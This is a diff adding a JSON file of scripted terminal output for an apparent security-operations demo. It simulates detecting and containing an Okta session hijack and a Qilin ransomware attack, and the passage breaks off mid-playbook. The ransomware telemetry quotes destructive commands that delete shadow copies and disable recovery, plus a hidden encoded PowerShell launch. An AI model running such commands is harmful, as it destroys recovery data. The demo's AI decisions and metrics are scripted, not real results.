@@ -1,0 +1,3614 @@
+{
+  "general": {
+    "id": "general",
+    "pkg_id": null,
+    "title": "SOaC General Overview",
+    "subtitle": "Full architecture lifecycle: Detection \u2192 Analysis \u2192 Response \u2192 Enforcement",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SOaC DISTRIBUTED INTELLIGENCE ARCHITECTURE \u2014 LIVE SIM     \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Initializing SOaC simulation environment...",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Loading synthetic threat data (lab_safety_policy: SIMULATE mode)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Edge nodes connected: edge-us-east-1, edge-eu-west-1, edge-ap-south-1",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] CLAW Engine v1.2.0 online. Brain oversight: ENABLED",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY (Detection Library) \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] Splunk correlation rule triggered: BODY-AITM-OKTA-7f3a9b",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Source: Okta System Log | EventType: user.session.start",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Actor: sim_user_042@lab.soac.internal",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Anomaly: 4 unique IPs across 3 geolocations in 180 seconds",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 10.0.1.55 (US-East) \u2192 10.0.2.77 (EU-West) \u2192 10.0.3.12 (AP-South)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 10.0.4.99 (Unknown Proxy) \u2190 Suspicious relay pattern",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] MITRE ATT&CK: T1557.001 (Adversary-in-the-Middle)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Risk Score: CRITICAL | Confidence: 94%",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Detection forwarded to The Brain for analysis...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN (Claude Security AI) \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Receiving detection BODY-AITM-OKTA-7f3a9b...",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Governance check: ai_governance_baseline.yaml loaded",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Prompt injection scan: CLEAN",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Analyzing behavioral intent...",
+        "type": "info"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 IP reputation lookup: 10.0.4.99 \u2192 known AitM proxy infra",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 User behavior baseline: DEVIATION (99th percentile)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 Threat actor correlation: matches 0APT campaign TTPs",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Confidence adjusted: 94% \u2192 97%",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended playbook: revoke-compromised-sessions v1.2.0",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE | Audit hash: sha256:e4f7a2...",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE (CLAW Engine) \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading playbook: revoke-compromised-sessions v1.2.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Step 1/3: enrich_user \u2192 Okta API /api/v1/users/...",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 User context enriched",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/3: revoke_okta_sessions \u2192 DELETE /sessions",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 6 active sessions revoked",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/3: notify_edge \u2192 Push enforcement to edge nodes",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 Dispatching to The Edge...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE NERVOUS SYSTEM (Edge Enforcement) \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Enforcing session block...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 edge-us-east-1: ENFORCED \u2713 (2ms)",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 edge-eu-west-1: ENFORCED \u2713 (47ms)",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 edge-ap-south-1: ENFORCED \u2713 (89ms)",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SIMULATION COMPLETE                                    \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Threat contained in 4.7 seconds (simulated)              \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced: SIMULATE mode active.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Detecting AitM...",
+      "body_done": "Threat Detected",
+      "brain_active": "Analyzing Intent...",
+      "brain_done": "Decision: APPROVE",
+      "purpose_active": "Executing Playbook...",
+      "purpose_done": "Playbook Complete",
+      "edge_active": "Blocking Session...",
+      "edge_done": "Edges Enforced"
+    },
+    "success_metrics": "Breakout Time: 4.7s | Status: Contained | Manual Intervention: None"
+  },
+  "pkg-001": {
+    "id": "pkg-001",
+    "pkg_id": "pkg-001",
+    "title": "0APT Identity Pivot",
+    "subtitle": "AitM phishing \u2192 session hijack \u2192 lateral movement via Okta/Entra ID",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: 0APT IDENTITY PIVOT \u2014 pkg-001                   \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   AitM Phishing \u2192 Session Hijack \u2192 Identity Lateral Move    \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: 0APT Identity Pivot",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor profile: 0APT (Advanced Persistent Threat)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1557.001, T1078.004, T1539",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: Okta System Log, Azure AD Sign-in Logs, CrowdStrike",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Lab safety: SIMULATE mode | Synthetic identity data",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Identity Telemetry Ingestion \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] index=okta sourcetype=OktaIM2:log",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] | spath output=eventType path=eventType",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] | spath output=actor_email path=actor.alternateId",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] | where eventType IN (\"user.session.start\", \"user.authentication.sso\")",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Correlation window: 300 seconds | Thresholds: unique_ips>2, unique_geos>1",
+        "type": "body"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] \u26a1 Detection triggered: BODY-AITM-OKTA-7f3a9b",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Actor: d.chen@corp.lab.soac | EventType: user.session.start",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Anomaly detected: 5 unique IPs across 3 geolocations in 147s",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 198.51.100.22 (Washington, US)  \u2190 legitimate baseline",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 203.0.113.44 (Frankfurt, DE)   \u2190 new geolocation",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 192.0.2.88 (Singapore, SG)     \u2190 impossible travel",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 100.64.0.17 (Tor exit node)    \u2190 anonymizing proxy",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 198.18.0.5 (Unknown CDN)       \u2190 AitM relay pattern",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] User-Agent variance: Chrome/120 \u2192 Python-urllib/3.11 \u2192 curl/8.4",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] risk_score = CRITICAL | unique_geos >= 3",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Detection hash: BODY-AITM-OKTA-e4a917c3f2b8",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain for threat analysis...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 AI Threat Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Receiving detection BODY-AITM-OKTA-e4a917c3f2b8...",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Loading governance: ai_governance_baseline.yaml",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Prompt injection scan: CLEAN \u2713",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] PII detection: actor email \u2192 REDACTED in logs",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision authority: CRITICAL \u2192 brain_oversight REQUIRED",
+        "type": "brain"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Analyzing behavioral intent...",
+        "type": "info"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 IP 100.64.0.17 \u2192 Tor exit node (known AitM infrastructure)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 IP 198.18.0.5 \u2192 matches Evilginx2 proxy fingerprint",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Session token entropy: abnormal (replayed token detected)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 User-Agent flip: browser \u2192 scripting tool \u2192 curl pipeline",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Behavior baseline deviation: 99.7th percentile",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 Threat actor correlation: 92% match \u2192 0APT campaign TTPs",
+        "type": "brain"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Confidence: 94% \u2192 98% (enrichment confirms AitM + token replay)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended playbook: revoke-compromised-sessions v1.2.0",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE execution",
+        "type": "success"
+      },
+      {
+        "text": "[BRAIN] Audit hash: sha256:e4f7a2c918b3d6...  | Immutable log stored",
+        "type": "brain"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 CLAW Playbook Execution \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: revoke-compromised-sessions v1.2.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] apiVersion: claw.soac.io/v1 | kind: Playbook",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] severity: CRITICAL | mitre_attack: [T1557.001, T1078.004]",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Trigger matched: detection_type=aitm_session_hijack, risk=CRITICAL",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Cooldown check: CLEAR (last execution >5m ago)",
+        "type": "purpose"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Step 1/5: enrich_user",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: okta_api | action: GET /api/v1/users/{userId}",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Department=Engineering, MFA=enabled, Risk=HIGH",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/5: revoke_okta_sessions",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: okta_api | action: DELETE /api/v1/users/{userId}/sessions",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 6 active sessions revoked across 4 devices",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/5: revoke_azure_tokens",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: ms_graph | action: POST /users/{userId}/revokeSignInSessions",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Azure AD refresh tokens invalidated",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 4/5: push_edge_enforcement",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: edge_api | action: POST /enforce",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 Dispatching to The Edge...",
+        "type": "info"
+      },
+      {
+        "text": "[CLAW] Step 5/5: notify_soc",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: slack | channel: #soc-critical",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 SOC team alerted with full incident context",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE NERVOUS SYSTEM \u2014 Edge Enforcement \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Receiving enforcement from CLAW playbook...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Verifying HMAC-SHA256 signature...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   headers: X-SOaC-Timestamp, X-SOaC-Signature, X-SOaC-Node-ID",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   signature_input = timestamp|POST|/enforce|body_sha256|node_id",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Enforcing session block...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Action: block_session | Scope: user=d.chen@corp | TTL: 24h",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Propagating to edge fleet:",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 edge-us-east-1: ENFORCED \u2713 (2ms)   \u2014 session blackholed",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 edge-eu-west-1: ENFORCED \u2713 (47ms)  \u2014 tokens revoked at proxy",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 edge-ap-south-1: ENFORCED \u2713 (89ms) \u2014 geo-fence activated",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE] Enforcement ID: EDGE-ENF-2026-0APT-001",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Audit trail: sha256:f8c3b1... | Immutable log stored",
+        "type": "edge"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SCENARIO COMPLETE: 0APT Identity Pivot                  \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Breakout Time: 4m 12s \u2192 Contained in 3.8s (automated)    \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Sessions revoked: 6 | Tokens invalidated: 3 | Edges: 3/3 \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced. No production systems affected.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Ingesting Okta Logs...",
+      "body_done": "AitM Detected",
+      "brain_active": "Correlating 0APT TTPs...",
+      "brain_done": "Decision: APPROVE",
+      "purpose_active": "Revoking Sessions...",
+      "purpose_done": "5/5 Steps Done",
+      "edge_active": "Blocking Identity...",
+      "edge_done": "3/3 Edges Enforced"
+    },
+    "success_metrics": "Breakout Time: 4m 12s \u2192 Contained: 3.8s | Sessions Revoked: 6 | Edges: 3/3"
+  },
+  "pkg-002": {
+    "id": "pkg-002",
+    "pkg_id": "pkg-002",
+    "title": "Qilin Ransomware Containment",
+    "subtitle": "Ransomware detonation \u2192 host isolation \u2192 forensic capture \u2192 SOC notification",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: QILIN RANSOMWARE CONTAINMENT \u2014 pkg-002         \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   Ransomware Detonation \u2192 Isolation \u2192 Forensics \u2192 Response  \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: Qilin Ransomware Containment",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor profile: Qilin (Ransomware-as-a-Service)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1486, T1059, T1068, T1490",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: CrowdStrike Falcon, Microsoft Defender, Splunk ES",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Endpoint Telemetry Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] CrowdStrike Falcon alert: HIGH severity detection",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] DetectionType: RansomwareActivity | Host: WS-FIN-042",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Process chain: outlook.exe \u2192 cmd.exe \u2192 powershell.exe \u2192 qilin.exe",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 powershell.exe -enc [Base64 payload] -nop -w hidden",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 vssadmin.exe delete shadows /all /quiet  (T1490)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 bcdedit.exe /set {default} recoveryenabled no",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 qilin.exe -encrypt -ext .qilin -note README_RESTORE.txt",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] File entropy spike: 47 files encrypted in 12 seconds",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Shadow copies deleted | Recovery disabled | Encryption active",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Risk Score: CRITICAL | Confidence: 99%",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain for immediate analysis...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 Ransomware Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] CRITICAL detection received: RansomwareActivity",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Governance: CRITICAL severity \u2192 autonomous containment authorized",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Analyzing behavioral intent...",
+        "type": "info"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Process tree: matches Qilin execution chain (T1059 + T1486)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 VSS deletion + recovery disable = pre-encryption preparation",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 File entropy analysis: encryption in progress (AES-256)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Lateral movement indicators: SMB scanning on port 445",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 No data exfiltration detected (yet) \u2014 containment window open",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Confidence: 99% | Blast radius: 1 host (containable)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended playbook: isolate-compromised-host v1.1.0",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE \u2014 time-critical autonomous execution",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 Host Isolation Playbook \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: isolate-compromised-host v1.1.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] severity: CRITICAL | mitre_attack: [T1486, T1059, T1068]",
+        "type": "purpose"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Step 1/5: verify_host_identity",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: crowdstrike_api | GET /devices/entities/devices/v2",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Host confirmed: WS-FIN-042 | OS: Win11 | Agent: active",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/5: network_containment",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: crowdstrike_api | POST /devices/entities/devices-actions/v2",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Network isolation ACTIVE \u2014 host quarantined",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/5: kill_malicious_process",
+        "type": "purpose"
+      },
+      {
